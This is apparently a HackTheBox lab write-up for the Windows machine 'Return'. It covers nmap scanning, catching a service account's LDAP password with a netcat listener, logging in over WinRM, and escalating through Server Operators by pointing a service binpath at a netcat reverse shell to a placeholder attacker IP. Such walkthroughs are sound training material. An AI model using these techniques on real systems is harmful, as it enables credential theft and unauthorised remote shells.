+++ 
title = "Return HTB Write up"
description = "Write up for the HTB machine 'Return'"
author = "greatmoves"
tags=["hackthebox", "easy", "evil-winrm", "privilege escalation", "windows", "service control"]
date = 2023-05-12
+++

# Inital recon

## nmap 
`nmap -sC -sV 10.10.11.108`

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-12 04:05:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 18m10s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-05-12T04:05:17
|_  start_date: N/A
```

`nmap -p- 10.10.11.108`
```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```

## Web recon
The web application is hosting a page at `10.10.11.108/settings.php`. Submitting the page with the `update` button and capturing this POST request in burpsuite we can see that there the only field being sent is the ip address.

Spin up a netcat listener and send through the ip of your attacking machine as the value for the ip in the POST request, making sure that your listener is listening on port `389`

From there we get this output
```
0*`%return\svc-printer�
                       1edFg43012!!
```
Judging by the web application, we can assume that `1edFg43012!!` is a potential password

# user.txt

## evil-winrm
We can see from our second nmap scan that there is a port for WinRm. Let's use evil-winrm to get a shell

`evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'`

The user flag can be found at `C:\Users\svc-printer\Desktop`

# root.txt

As the user `svc-printer` let's check our privileges using `whoami /priv`

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

let's also check which groups the user is in too using `whoami /groups`
```
GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

The [Server Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators) group most importantly allows us to stop and start services

So, let's upload `nc64.exe` and use that to be the binary for a service. When we start the service, we will be able to catch a shell.

In our `evil-winrm` shell we can run the command `upload /home/kali/Desktop/htb/nc64.exe` to upload the `nc64.exe` binary.
Then 
```powershell
sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\Users\svc-printer\Desktop\nc64.exe -e cmd YOUR_IP PORT"
```
to set the binary for the service VSS to `cmd.exe` with the arguments to run the `nc64.exe` binary.

Note: `sc.exe` is Service Control, which is what allows us to create, start, stop, query or delete any windows service.

Then, spin up a netcat listener on the same port you specified in the `sc.exe` command, then in the `evil-winrm` shell run `sc.exe stop VSS` and then `sc.exe start VSS` and your netcat listener will catch a root shell.

The root flag can be found at `C:\Users\Administrator\Desktop`


